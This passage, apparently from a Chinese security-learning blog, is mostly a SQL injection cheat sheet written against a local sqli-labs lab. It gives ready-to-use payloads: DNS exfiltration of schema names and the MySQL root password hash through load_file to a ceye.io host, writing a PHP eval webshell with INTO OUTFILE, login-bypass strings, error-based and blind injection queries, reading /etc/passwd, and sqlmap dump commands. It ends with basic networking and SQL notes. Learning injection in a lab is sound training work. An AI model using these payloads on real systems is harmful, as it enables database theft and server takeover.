(猜名字)</p>\n</li>\n</ul>\n</li>\n<li><p>将查到的库名放到同一个字符串</p>\n<ul>\n<li>select GROUP_CONCAT(schema_name) from information_schema.schemata</li>\n</ul>\n</li>\n<li><p>查到数单个据库名发送到ceye</p>\n<ul>\n<li>union select 1,(select load_file(concat(‘\\\\‘,substr((select schema_name from information_schema.schemata  limit 1),1,41),’.mysql.ip.port.38ljf2.ceye.io\\abc’)))–+</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"查找数据表\"><a href=\"#查找数据表\" class=\"headerlink\" title=\"查找数据表\"></a>查找数据表</h4><ul>\n<li><p>union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=’security’) ,3 </p>\n</li>\n<li><p>将单个表名发送到ceye</p>\n<p>uname=1’) union select 3,(select load_file(concat(‘\\\\‘,substr((select table_name from information_schema.tables where table_schema =’security’  limit 1),1,41),’.mysql.ip.port.38ljf2.ceye.io\\abc’)))–+</p>\n</li>\n</ul>\n<h4 id=\"查找数据表中所有字段（列）\"><a href=\"#查找数据表中所有字段（列）\" class=\"headerlink\" title=\"查找数据表中所有字段（列）\"></a>查找数据表中所有字段（列）</h4><ul>\n<li><h4 id=\"127-0-0-1-Less-3-id-100’-union-select-1-select-group-concat-column-name-from-information-schema-columns-where-table-name-’users’-and-table-schema-’security’-–\"><a href=\"#127-0-0-1-Less-3-id-100’-union-select-1-select-group-concat-column-name-from-information-schema-columns-where-table-name-’users’-and-table-schema-’security’-–\" class=\"headerlink\" title=\"127.0.0.1/Less-3/?id=100’) union select 1,(select group_concat(column_name) from information_schema.columns where table_name=’users’ and table_schema=’security’) –+\"></a>127.0.0.1/Less-3/?id=100’) union select 1,(select group_concat(column_name) from information_schema.columns where table_name=’users’ and table_schema=’security’) –+</h4></li>\n<li><p>获取内容</p>\n<ul>\n<li>union select 1,(select group_concat(username) from security.users limit 0,1),3 </li>\n</ul>\n</li>\n<li><p>查询某一个表的字段名发送到ceye</p>\n<ul>\n<li>union select 1,(select load_file(concat(‘\\\\‘,substr((select column_name from information_schema.columns where table_name=’users’ and table_schema=’security’ limit 1),1,41),’.mysql.ip.port.38ljf2.ceye.io\\abc’)))–+</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"猜解账号密码\"><a href=\"#猜解账号密码\" class=\"headerlink\" title=\"猜解账号密码\"></a>猜解账号密码</h4><ul>\n<li><p>outfile文件注入</p>\n<ul>\n<li>union select 1,’<?php @eval($_POST[360]);?>‘ into outfile ‘C:\\phpStudy\\PHPTutorial\\WWW\\Less-8\\3.php’–+</li>\n<li>into outfile ‘C:\\phpStudy\\PHPTutorial\\WWW\\Less-13\\1.txt’</li>\n</ul>\n</li>\n<li><p>查root密码ceye代码</p>\n<p>127.0.0.1/Less-1/?id=1’ union SELECT 1,(LOAD_FILE(CONCAT(‘\\\\‘,mid((SELECT password FROM mysql.user WHERE user=’root’ LIMIT 1),2,41),’.mysql.ip.port.38ljf2.ceye.io\\abc’))),3–+</p>\n</li>\n<li><p>bug   </p>\n<p>uname=1’) or 1=1 into outfile ‘C:\\phpStudy\\PHPTutorial\\WWW\\Less-13\\1.txt’;–+</p>\n<p>这个文件里会有所有的用户名和密码</p>\n</li>\n<li><p>查询数据</p>\n<p>union select 1,(select 1 from (select count(<em>),concat((select(select(select distinct concat(username,password) from users limit 0,1))from information_schema.tables limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a) –+</p>\n</li>\n</ul>\n<h4 id=\"绕过登陆验证\"><a href=\"#绕过登陆验证\" class=\"headerlink\" title=\"绕过登陆验证\"></a>绕过登陆验证</h4><ul>\n<li>admin’ –</li>\n<li>admin’ #</li>\n<li>admin’/*</li>\n<li>‘ or 1=1–</li>\n<li>‘ or 1=1#</li>\n<li>‘ or 1=1/*</li>\n<li>‘) or ‘1’=’1–</li>\n<li>‘) or (‘1’=’1–</li>\n</ul>\n<h4 id=\"SQL注入常见函数\"><a href=\"#SQL注入常见函数\" class=\"headerlink\" title=\"SQL注入常见函数\"></a>SQL注入常见函数</h4><ul>\n<li><p>group_concat函数   可以把查询的内容组合成一个字符串</p>\n</li>\n<li><p>load_file(file name )  读取文件并将文件按字符串返回</p>\n</li>\n<li><p>left（string，length）返回最左边指定的字符数：<br>left（database（），1）&gt;’s’  (猜名字)</p>\n</li>\n<li><p>length（）判断长度<br>length（database（）&gt;5 </p>\n</li>\n<li><p>substr（a，b，c）从字符串a中截取 b到c长度</p>\n</li>\n<li><p>ascii（）将某个字符转为ascii值</p>\n<p>ascii（substr（user（），1，1））=101#</p>\n</li>\n<li><p>mid（（a，b，c）从字符串a中截取 b到c位置（可以用来猜数据库名 ）</p>\n</li>\n</ul>\n<h3 id=\"9-SQL注入备忘\"><a href=\"#9-SQL注入备忘\" class=\"headerlink\" title=\"9. SQL注入备忘\"></a>9. SQL注入备忘</h3><h4 id=\"SQL注入常用命令\"><a href=\"#SQL注入常用命令\" class=\"headerlink\" title=\"SQL注入常用命令\"></a>SQL注入常用命令</h4><ul>\n<li><p>查看当前用户：union select 1,(select user())–+</p>\n</li>\n<li><p>查看数据库版本：union select 1,(select version())–+</p>\n</li>\n<li><p>查看当前数据库名：union select 1,(select database())–+</p>\n</li>\n<li><p>查看操作系统union select 1,(select @@version_compile_os)–+</p>\n</li>\n<li><p>所有用户：</p>\n<ul>\n<li><p>union select 1,(select group_concat(user) from mysql.user)–</p>\n<p>+</p>\n</li>\n</ul>\n</li>\n<li><p>用户hash</p>\n<ul>\n<li>union select 1,(select group_concat(password) from mysql.user where user=’root’)</li>\n</ul>\n</li>\n<li><p>查看所有数据库名</p>\n<ul>\n<li>union select 1,(SELECT group_concat(schema_name) from information_schema.schemata)–+</li>\n</ul>\n</li>\n<li><p>查看某一个库的全部表</p>\n<ul>\n<li>union select 1,(SELECT group_concat(table_name) from information_schema.tables where table_schema=’库名’)–+</li>\n<li>union select 1,(SELECT group_concat(table_name) from information_schema.table_constraints where table_schema=’库名’</li>\n</ul>\n</li>\n<li><p>查看某个表的字段名</p>\n<ul>\n<li>union select 1,(SELECT group_concat(column_name) from information_schema.columns where table_name=’表名’)–+</li>\n</ul>\n</li>\n<li><p>查看某个库中某个表的字段名</p>\n<ul>\n<li>union select 1,(select group_concat(column_name) from information_schema.columns where table_name=’表名’ and table_schema=’库名’)–+</li>\n</ul>\n</li>\n<li><p>读文件</p>\n<ul>\n<li>union select 1,(SELECT load_file(‘/etc/passwd’))–+</li>\n</ul>\n</li>\n<li><p>写文件</p>\n<ul>\n<li>union select 1,’<?php @eval($_POST[360]);?>‘ into outfile ‘C:\\phpStudy\\PHPTutorial\\WWW\\Less-8\\3.php’–+</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"UNION注入\"><a href=\"#UNION注入\" class=\"headerlink\" title=\"UNION注入\"></a>UNION注入</h4><ul>\n<li>猜字段长度<ul>\n<li>order by 数字     uname=1’ order by 2</li>\n</ul>\n</li>\n<li>暴字段位置<ul>\n<li>union select 1,2      uname=1’ union select 1,2</li>\n</ul>\n</li>\n<li>在指定表中查询制指定用户的密码<ul>\n<li>union SELECT 1,password from 表 where username=’用户名’–+</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"报错注入\"><a href=\"#报错注入\" class=\"headerlink\" title=\"报错注入\"></a>报错注入</h4><ul>\n<li><p>floor   （SELECT user()可修改）</p>\n<ul>\n<li>OR (SELECT 8627 FROM(SELECT COUNT(<em>),CONCAT(0x70307e,(SELECT user()),0x7e7030,FLOOR(RAND(0)</em>2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)–+</li>\n</ul>\n</li>\n<li><h3 id=\"ExtractValue-有长度限制-最长32位-（select-version可修改）\"><a href=\"#ExtractValue-有长度限制-最长32位-（select-version可修改）\" class=\"headerlink\" title=\"ExtractValue(有长度限制,最长32位)   （select @@version可修改）\"></a>ExtractValue(有长度限制,最长32位)   （select @@version可修改）</h3><ul>\n<li>and extractvalue(1, concat(0x7e, (select @@version),0x7e))–+</li>\n</ul>\n</li>\n<li><h3 id=\"UpdateXml-有长度限制-最长32位-（SELECT-version可修改）\"><a href=\"#UpdateXml-有长度限制-最长32位-（SELECT-version可修改）\" class=\"headerlink\" title=\"UpdateXml(有长度限制,最长32位)  （SELECT @@version可修改）\"></a>UpdateXml(有长度限制,最长32位)  （SELECT @@version可修改）</h3><ul>\n<li>and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)–+</li>\n</ul>\n</li>\n<li><h3 id=\"NAME-CONST-适用于低版本，不太好用\"><a href=\"#NAME-CONST-适用于低版本，不太好用\" class=\"headerlink\" title=\"NAME_CONST(适用于低版本，不太好用)\"></a>NAME_CONST(适用于低版本，不太好用)</h3><ul>\n<li>and 1=(select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)–+</li>\n</ul>\n</li>\n<li><h3 id=\"Error-based-Double-Query-Injection\"><a href=\"#Error-based-Double-Query-Injection\" class=\"headerlink\" title=\"Error based Double Query Injection\"></a>Error based Double Query Injection</h3><ul>\n<li>or 1 group by concat_ws(0x7e,version(),floor(rand(0)*2)) having min(0) or 1–+</li>\n</ul>\n</li>\n<li><h3 id=\"exp-5-5-5以上-（select-user-可修改）\"><a href=\"#exp-5-5-5以上-（select-user-可修改）\" class=\"headerlink\" title=\"exp(5.5.5以上) （select user()可修改）\"></a>exp(5.5.5以上) （select user()可修改）</h3><ul>\n<li>and (select exp(~(select * from(select user())x)))–+</li>\n</ul>\n</li>\n<li><p>floor(Mysql):  and (select 1 from (select count(<em>),concat(user(),floor(rand(0)</em>2))x from information_schema.tables group by x)a);</p>\n</li>\n<li><p>Extractvalue(Mysql):  and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</p>\n</li>\n<li><p>Updatexml(Mysql):  and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</p>\n</li>\n<li><p>EXP: and exp(~(select * from(select user())a));</p>\n</li>\n<li><p>UTL INADDR. get host address(Oracle): and 1=utl inaddrget host address(select bannerO from sys.v_$version where rownum=1))</p>\n</li>\n<li><p>multipoint(Mysql)：and multipoint((select * from(select * from(select user())a)b));</p>\n</li>\n<li><p>polygon(Mysql)：and polygon((select * from(select * from(select user())a)b));</p>\n</li>\n<li><p>multipolygon(Mysql)：and multipolygon((select * from(select * from(select user())a)b));</p>\n</li>\n<li><p>linestring(Mysql)：and linestring((select * from(select * from(select user())a)b));</p>\n</li>\n<li><p>multilinestring(Mysql)：and multilinestring((select * from(select * from(select user())a)b));</p>\n</li>\n</ul>\n<h4 id=\"bool盲注\"><a href=\"#bool盲注\" class=\"headerlink\" title=\"bool盲注\"></a>bool盲注</h4><ul>\n<li><p>盲注的时候一定注意，MySQL4之后大小写不敏感，可使用binary()函数使大小写敏感。</p>\n</li>\n<li><h5 id=\"布尔条件构造\"><a href=\"#布尔条件构造\" class=\"headerlink\" title=\"布尔条件构造\"></a>布尔条件构造</h5><ul>\n<li><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//正常情况</span><br><span class=\"line\">'or bool<span class=\"comment\">#</span></span><br><span class=\"line\">true'and bool<span class=\"comment\">#</span></span><br><span class=\"line\">    </span><br><span class=\"line\">//不使用空格、注释</span><br><span class=\"line\">'or(bool)='1</span><br><span class=\"line\">true'and(bool)='1</span><br><span class=\"line\">    </span><br><span class=\"line\">//不使用or、and、注释</span><br><span class=\"line\">'^!(bool)='1</span><br><span class=\"line\">'=(bool)='</span><br><span class=\"line\">'||(bool)='1</span><br><span class=\"line\">true'%26%26(bool)='1</span><br><span class=\"line\">'=if((bool),1,0)='0</span><br><span class=\"line\">    </span><br><span class=\"line\">//不使用等号、空格、注释</span><br><span class=\"line\">'or(bool)&lt;&gt;'0</span><br><span class=\"line\">'or((bool)in(1))or'0</span><br><span class=\"line\">    </span><br><span class=\"line\">//其他</span><br><span class=\"line\">or (case when (bool) then 1 else 0 <span class=\"keyword\">end</span>)</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>有时候where字句有括号又猜不到SQL语句的时候，可以有下列类似的fuzz</p>\n</li>\n<li><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1' or (bool) or '1'='1</span><br><span class=\"line\">1%' and (bool) or 1=1 and '1'='1</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n</li>\n<li><h5 id=\"构造逻辑判断\"><a href=\"#构造逻辑判断\" class=\"headerlink\" title=\"构造逻辑判断\"></a>构造逻辑判断</h5><ul>\n<li><p>逻辑判断基本就那些函数：</p>\n</li>\n<li><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">left(user(),1)&gt;'r'  </span><br><span class=\"line\">right(user(),1)&gt;'r'  </span><br><span class=\"line\">substr(user(),1,1)='r'  </span><br><span class=\"line\">mid(user(),1,1)='r' </span><br><span class=\"line\">    </span><br><span class=\"line\">//不使用逗号 </span><br><span class=\"line\">user() regexp '^[a-z]'</span><br><span class=\"line\">user() like 'root%'</span><br><span class=\"line\">POSITION('root' in user())</span><br><span class=\"line\">mid(user() from 1 for 1)='r'</span><br><span class=\"line\">mid(user() from 1)='r'</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n</li>\n<li><h5 id=\"利用order-by盲注\"><a href=\"#利用order-by盲注\" class=\"headerlink\" title=\"利用order by盲注\"></a>利用order by盲注</h5><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select * from admin where username='' or 1 union select 1,2,'5' order by 3;</span><br><span class=\"line\">+<span class=\"comment\">----+----------+---------------------------</span></span><br><span class=\"line\">| id | username | password                   </span><br><span class=\"line\">+<span class=\"comment\">----+----------+---------------------------</span></span><br><span class=\"line\">|  1 | 2        | 5                         </span><br><span class=\"line\">|  1 | admin    | 51b7a76d51e70b419f60d34 |</span><br><span class=\"line\">+<span class=\"comment\">----+----------+---------------------------</span></span><br><span class=\"line\">2 rows in <span class=\"keyword\">set</span> (<span class=\"number\">0.00</span> sec)</span><br><span class=\"line\">    </span><br><span class=\"line\">mysql&gt; <span class=\"keyword\">select</span> * <span class=\"keyword\">from</span> <span class=\"keyword\">admin</span> <span class=\"keyword\">where</span> username=<span class=\"string\">''</span> <span class=\"keyword\">or</span> <span class=\"number\">1</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"string\">'6'</span> <span class=\"keyword\">order</span> <span class=\"keyword\">by</span> <span class=\"number\">3</span>;</span><br><span class=\"line\">+<span class=\"comment\">-----+--------+---------------------------</span></span><br><span class=\"line\">|id   |username| password                  </span><br><span class=\"line\">+<span class=\"comment\">----+--------+---------------------------</span></span><br><span class=\"line\">|  1  | admin- |51b7a76d51e70b419f60d3</span><br><span class=\"line\">|  1  |    2   | 6                            +<span class=\"comment\">------+----------+-------------------------</span></span><br><span class=\"line\">2 rows in <span class=\"keyword\">set</span> (<span class=\"number\">0.01</span> sec)</span><br></pre></td></tr></table></figure>\n\n</li>\n</ul>\n<h4 id=\"延时盲注\"><a href=\"#延时盲注\" class=\"headerlink\" title=\"延时盲注\"></a>延时盲注</h4><ul>\n<li>相对于bool盲注，就是把返回值0和1改为是否执行延时，<strong>能用其他方法就不使用延时</strong>。 </li>\n<li>一般格式<code>if((bool),sleep(3),0)</code>和<code>or (case when (bool) then sleep(3) else 0 end)</code></li>\n<li>两个函数： </li>\n<li>BENCHMARK(100000,MD5(1)) </li>\n<li>sleep(5)</li>\n<li>BENCHMARK()用于测试函数的性能，参数一为次数，二为要执行的表达式。可以让函数执行若干次，返回结果比平时要长，通过时间长短的变化，判断语句是否执行成功。这是一种边信道攻击，在运行过程中占用大量的cpu资源。推荐使用sleep()</li>\n</ul>\n<h4 id=\"Mysql注释符\"><a href=\"#Mysql注释符\" class=\"headerlink\" title=\"Mysql注释符\"></a>Mysql注释符</h4><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1. <span class=\"comment\">-- -</span></span><br><span class=\"line\">2. <span class=\"comment\">/* .... */</span></span><br><span class=\"line\">3. <span class=\"comment\">#</span></span><br><span class=\"line\">4. `</span><br><span class=\"line\">5. ;%00</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"GBK绕过注入\"><a href=\"#GBK绕过注入\" class=\"headerlink\" title=\"GBK绕过注入\"></a>GBK绕过注入</h4><ul>\n<li>在分号前加%df%27</li>\n<li>示例：id=1%d%27 union select 1.2–+</li>\n</ul>\n<ol start=\"10\">\n<li>自动化注入工具</li>\n</ol>\n<h4 id=\"SQL注入工具\"><a href=\"#SQL注入工具\" class=\"headerlink\" title=\"SQL注入工具\"></a>SQL注入工具</h4><ul>\n<li>sqlmap使用<ul>\n<li>测试注入点  sqlmap  -u  “URL”</li>\n<li>爆数据库  sqlmap  -u  “URL”  –dbs</li>\n<li>查看当前库  sqlmap  -u  “URL”  –current -db</li>\n<li>显示数据表  sqlmap  -u  “URL”  -D 数据库 –tables</li>\n<li>显示字段      sqlmap  -u  “URL”  -D 数据库 -T 表  –columns</li>\n<li>脱库  sqlmap  -u  “URL”  -D 数据库 -T 表  -C “字段名1”,”字段名2”  –dump</li>\n<li>查看帮助   man  sqlmap</li>\n<li>查看注入点   sqlmap -r  1.txt </li>\n<li>爆数据库   sqlmap -r  1.txt  –dbs    （注意在注入点后面加*）</li>\n<li>查看当前库  sqlmap  -r  1.txt  –current -db</li>\n<li>显示数据表   sqlmap   -r  1.txt   -D 数据库 –tables</li>\n<li>显示字段      sqlmap  -r  1.txt  -D 数据库 -T 表  –columns</li>\n<li>查看某字段数据  sqlmap  -r  1.txt  -D 数据库 -T 表  -C  “字段名，字段名”  –dump</li>\n</ul>\n</li>\n<li>havij</li>\n<li>sqlid</li>\n</ul>\n<h4 id=\"ASP、JSP注入工具\"><a href=\"#ASP、JSP注入工具\" class=\"headerlink\" title=\"ASP、JSP注入工具\"></a>ASP、JSP注入工具</h4><ul>\n<li>NBSI</li>\n<li>阿D注入软件</li>\n<li>明小子</li>\n</ul>\n<h4 id=\"PHP注入工具\"><a href=\"#PHP注入工具\" class=\"headerlink\" title=\"PHP注入工具\"></a>PHP注入工具</h4><ul>\n<li>穿山甲注入软件</li>\n<li>海阳顶端注入软件</li>\n</ul>\n<h4 id=\"安全专家用的注入工具\"><a href=\"#安全专家用的注入工具\" class=\"headerlink\" title=\"安全专家用的注入工具\"></a>安全专家用的注入工具</h4><ul>\n<li>BSQL Hacker（注入框架）</li>\n<li>The Mole（可攻击Mysql、SQL server、Postgres和oracle）</li>\n<li>Pangolin （白帽专用啊哈哈哈哈）</li>\n<li>sqlamp  （非常强大）</li>\n<li>Havij （可攻击Mysql、oracle、Postgres、MS Access）</li>\n<li>safe3 SQL Injector（简单易用）</li>\n<li>SQL Poizon</li>\n</ul>\n<h3 id=\"10-笔记\"><a href=\"#10-笔记\" class=\"headerlink\" title=\"10. 笔记\"></a>10. 笔记</h3><ul>\n<li>爆SQL<br>select schema_name from information_schema.schemata<br>猜数据库<br>select schema_name from information_schema.schemata limit 0,1 （limit第几行）<br>test</li>\n<li>select table_name from information_schema.tables where table_schema=’xxxxx’<br>猜某库的数据表</li>\n<li>select column_name from information_schema.columns where table_name=’xxxxx’<br>猜某表的所有列</li>\n<li>select <strong>* from *</strong></li>\n<li></li>\n<li>mid(a,b,c)从位置 b 开始，截取 a 字符串的 c 位<br>ord 同ASCII<br>substr（user(),2,1）<br>substr（database(),2,1）从databases数据库名的第2位，截取长度为1<br>Order by 对前面的数据进行排序<br>information_schema 系统数据库名<br>tables 表名<br>information_schema.tables 查询这个数据库表<br>table_schema 这个字段<br>select table_name from information_schema.tables where table_schema = “security”;<br>select 列名称from表名 where列 运算符 值<br>@$sql=”SELECT username, password FROM users WHERE username=’admin’or’1’=’1# and<br>password=’$passwd’ LIMIT 0,1”;<br>数据库运行的SQL语句代码如上:<br>输入“ ‘后，注意 提示语法错误的 注明 ’ ” ）<br>‘) or ‘1’=(‘1’<br>) or 1=1 -<br>‘) or 1=1 order by 2  查看几列</li>\n<li>显示登录信息可以使用联合查询得到数据库名等信息<br>uname=1admin’union select 1,database()– -&amp;passwd=&amp;submit=Submit<br>联合查询  得到  database(数据库名)</li>\n<li>不显示登录信息使用 布尔型盲注<br>uname=admin’)and left(database(),1)&gt;’a’#&amp;passwd=1&amp;submit=Submit<br>database(),1表示第一位 &gt;大于a        大于的话就返回true<br>left(database(),1) =’s’    截取数据库名的前1位<br>left(database(),2) =’se’  截取数据库名的前2位<br>length(database())=8  查看数据库的长度<br>left(version()1)=5    查看数据库第1位为5<br>通过二分法 查到某位没有&gt;,= a（或者数字）<br>注释掉最后字符 – - –+ # %23 （每个试）</li>\n<li>substr(database(),,c)从 b 位置开始，截取字符串 a 的 c 长度。Ascii()将某个字符转换<br>为 ascii 值</li>\n<li>admin’and If(ascii(substr(database(),2,1))=115,1,sleep(5))#<br>时间注入 正确的话 直接登录，否则延迟5秒，得出 数据库名为 security<br>‘and If(ascii(substr((select table_name from information_schema.tables where table_schema=’security’ limit 0,1),1,1))=101,1,sleep(5))– -<br>猜测第一个数据表的第一位是 e…依次类推，得到 emai<br>limit 0,1 从0的位置开始 第1行 是emai  limit 1,1 从1的位置开始 第1行 是 ？？<br>猜测 users 表的列<br><a href=\"http://127.0.0.1/sqllib/Less-9/?id=1&#39;and\" target=\"_blank\" rel=\"noopener\">http://127.0.0.1/sqllib/Less-9/?id=1&#39;and</a> If(ascii(substr((select column_name from information<br>_schema.columns where table_name=’users’ limit 0,1),1,1))=105,1,sleep(5))–+<br>猜测 username 的值<br><a href=\"http://127.0.0.1/sqllib/Less-9/?id=1&#39;and\" target=\"_blank\" rel=\"noopener\">http://127.0.0.1/sqllib/Less-9/?id=1&#39;and</a> If(ascii(substr((select username from users limit 0,1), 1,1))=68,1,sleep(5))– -<br>猜第2位<br>‘and If(ascii(substr((select username from users limit 0,1), 2,1))=117,1,sleep(5))– -<br>是Dump<br>SELECT CONCAT(id, ‘，’, name) AS con FROM info LIMIT 1<br>concat 某几列<br>limit1    行1<br>以上为  查询第一行的  id 列 和name列，中间用,号隔开</li>\n<li>报 错 注 入<br>1’ union Select 1,count(<em>),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)</em>2))a from information_schema.columns group by a–+</li>\n<li>uname=admin”and extractvalue(1,concat(0x7e,(select @@version),0x7e))#&amp;passwd=1&amp;sub<br>If(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23</li>\n<li>select table_name from information_schema.tables where table_schema=’security’ limit 0,1<br>table_name<br>MYSQL 里面所有的表<br>information_schema.tables</li>\n<li>系统函数<br>介绍几个常用函数：</li>\n<li><ol>\n<li>version()——MySQL 版本</li>\n<li>user()——数据库用户名</li>\n<li>database()——数据库名</li>\n<li>@@datadir——数据库路径</li>\n<li>@@version_compile_os——操作系统版本</li>\n</ol>\n</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"1-OSI七层模型\"><a href=\"#1-OSI七层模型\" class=\"headerlink\" title=\"1. OSI七层模型\"></a>1. OSI七层模型</h3><ul>\n<li>物理层 、数据链路层、网络层、传输层、会话层、表示层、应用层</li>\n</ul>\n<h3 id=\"2-TCP三次握手\"><a href=\"#2-TCP三次握手\" class=\"headerlink\" title=\"2. TCP三次握手\"></a>2. TCP三次握手</h3><ul>\n<li>（1）客户端发送SYN（SEQ=x）报文给服务器端，进入SYN_SEND状态。</li>\n<li>（2）服务器端收到SYN报文，回应一个SYN （SEQ=y）ACK(ACK=x+1）报文，进入<a href=\"https://baike.baidu.com/item/SYN_RECV\" target=\"_blank\" rel=\"noopener\">SYN_RECV</a>状态。</li>\n<li>（3）客户端收到服务器端的SYN报文，回应一个ACK(ACK=y+1）报文，进入Established状态。</li>\n</ul>\n<h3 id=\"3-TCP四次分手\"><a href=\"#3-TCP四次分手\" class=\"headerlink\" title=\"3. TCP四次分手\"></a>3. TCP四次分手</h3><ul>\n<li>（1）某个应用进程首先调用close，称该端执行“主动关闭”（active close）。该端的TCP于是发送一个FIN分节，表示数据发送完毕。</li>\n<li>(2) 接收到这个FIN的对端执行 “被动关闭”（passive close），这个FIN由TCP确认。</li>\n<li>(3) 一段时间后，接收到这个文件结束符的应用进程将调用close关闭它的套接字。这导致它的TCP也发送一个FIN。</li>\n<li>(4) 接收这个最终FIN的原发送端TCP（即执行主动关闭的那一端）确认这个FIN。 </li>\n</ul>\n<h3 id=\"4-HTTP状态码\"><a href=\"#4-HTTP状态码\" class=\"headerlink\" title=\"4. HTTP状态码\"></a>4. HTTP状态码</h3><ul>\n<li>2XX  成功</li>\n<li>3XX  跳转</li>\n<li>4XX  错误</li>\n<li>5XX   服务器错误</li>\n</ul>\n<h3 id=\"5-常用端口\"><a href=\"#5-常用端口\" class=\"headerlink\" title=\"5.  常用端口\"></a>5.  常用端口</h3><ul>\n<li>21   FTP</li>\n<li>22  SSH</li>\n<li>23  Telent</li>\n<li>25   SMTP</li>\n<li>53   DNS</li>\n<li>80   HTTP</li>\n<li>135 </li>\n<li>139 </li>\n<li>443  HTTPS</li>\n<li>445  SMB</li>\n<li>1433  SQLSERVER</li>\n<li>1521   ORCAL</li>\n<li>3306  MYSQL</li>\n<li>3389   rdp</li>\n<li>4899    远程桌面</li>\n<li>5900-59XX   VNC</li>\n<li>8080  管理端口</li>\n</ul>\n<h3 id=\"6-数据库基础\"><a href=\"#6-数据库基础\" class=\"headerlink\" title=\"6. 数据库基础\"></a>6. 数据库基础</h3><h4 id=\"主流数据库\"><a href=\"#主流数据库\" class=\"headerlink\" title=\"主流数据库\"></a>主流数据库</h4><ul>\n<li>SQL SERVER</li>\n<li>MYSQL</li>\n<li>oraccle</li>\n<li>PostgreSQL</li>\n<li>可以使用  Navicat premium  连接数据库</li>\n</ul>\n<h4 id=\"数据库查询版本\"><a href=\"#数据库查询版本\" class=\"headerlink\" title=\"数据库查询版本\"></a>数据库查询版本</h4><ul>\n<li>Mssql   select  @@version</li>\n<li>Mysql    select  vresion（）/select @@version</li>\n<li>oracle    select banner from ￥version</li>\n<li>Postgresql  select version（）</li>\n</ul>\n<h4 id=\"SQL语法基础\"><a href=\"#SQL语法基础\" class=\"headerlink\" title=\"SQL语法基础\"></a>SQL语法基础</h4><ul>\n<li><p>库操作</p>\n<ul>\n<li>连接数据库   mysql  -u  用户名 -p</li>\n<li>创建数据库：create database  数据库名称、</li>\n<li>删除数据库    drop  database 数据库名称、</li>\n<li>列出数据库  show databases</li>\n<li>使用数据据库  use 数据库名称、</li>\n<li>查看当前数据库   select database（）</li>\n</ul>\n</li>\n<li><p>表操作</p>\n<ul>\n<li>新建表create table  表名（键 varchar（10），键int（10））</li>\n<li>列出表  show tables</li>\n<li>删除表  delete  表名</li>\n</ul>\n</li>\n<li><p>数据操作</p>\n<ul>\n<li><p>增加数据insert into  表名（键，键）values（值，值）</p>\n</li>\n<li><p>删除数据 delete from 表名 where  键=值（删除某一行数据）</p>\n</li>\n<li><p>修改数据 updata 表名 set 键 = 值 where 键=值</p>\n</li>\n<li><p>查询数据  select * fom 表名</p>\n<p>存放数据库 information_ schema（存放schemata、  table、columns等等）     </p>\n<p>存放数据库名  schemata</p>\n<p>表  table</p>\n<p>字段  columns</p>\n</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"7-注入漏洞\"><a href=\"#7-注入漏洞\" class=\"headerlink\" title=\"7.  注入漏洞\"></a>7.  注入漏洞</h3><h4 id=\"注入概述\"><a href=\"#注入概述\" class=\"headerlink\" title=\"注入概述\"></a>注入概述</h4><ul>\n<li>什么是注入漏洞、<ul>\n<li>注入攻击的本质，Web应用程序没有过滤用户输入*，直接把用户输入的恶意数据当做代码执行</li>\n<li>两个条件<ul>\n<li>用户能够控制输入</li>\n<li>原本程序要执行的代码，拼接了用户输入的数据</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"注入类型\"><a href=\"#注入类型\" class=\"headerlink\" 